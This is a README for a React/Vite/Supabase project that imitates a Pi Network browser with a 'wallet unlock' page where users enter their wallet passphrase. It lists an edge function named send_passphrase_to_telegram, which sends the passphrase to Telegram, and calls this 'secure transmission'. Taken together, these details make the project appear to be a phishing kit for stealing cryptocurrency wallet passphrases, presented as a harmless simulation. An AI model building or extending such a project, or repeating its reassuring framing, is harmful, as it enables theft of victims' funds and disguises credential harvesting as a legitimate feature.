# Project Overview

This is a React application built with Vite, TypeScript, and Tailwind CSS. It simulates a Pi Network browser interface with wallet unlock functionality.

## Development Commands

- **Build**: `npm run build` - Builds the project for production.
- **Development Server**: `npm run dev` - Starts the development server.
- **Lint**: `npm run lint` - Runs ESLint to check for code quality issues.
- **Preview**: `npm run preview` - Previews the production build locally.
- **Test Edge Functions**: `npm run test:edge-functions` - Runs tests for Supabase edge functions (requires Deno).

## Architecture

### Frontend
- **Framework**: React with Vite
- **Styling**: Tailwind CSS with `shadcn/ui` components
- **Routing**: `react-router-dom` for client-side routing
- **State Management**: React `useState` and `useEffect` hooks
- **Icons**: HugeIcons (via CDN) for a professional look
- **Theme**: Custom Pi Network color palette (`pi-purple`, `pi-gold`) with professional UI enhancements (shadows, transitions, rounded corners).

### Directory Structure
- `src/pages`: Contains the main page components (`Index.tsx`, `UnlockPi.tsx`, `WalletUnlock.tsx`).
- `src/components/ui`: Reusable UI components (buttons, inputs, sliders, etc.).
- `src/hooks`: Custom React hooks (e.g., `use-toast` for notifications).
- `src/lib`: Utility functions and helpers.
- `src/integrations/supabase`: Supabase client configuration.

### Backend / Edge Functions
- Located in `supabase/edge_function`.
- Uses Deno for runtime.
- `send_passphrase_to_telegram_2025_11_20_14_51.ts`: Handles secure transmission of data (simulated or actual integration).

## Database
- The project integrates with Supabase.
- Credentials are configured in `src/integrations/supabase/client.ts`.

## Key Features
- **Home Page**: Dashboard with various Pi Network app icons.
- **Unlock Pi**: Interface to check locked Pi balance (simulated).
- **Wallet Unlock**: Secure interface to enter wallet passphrase with validation.
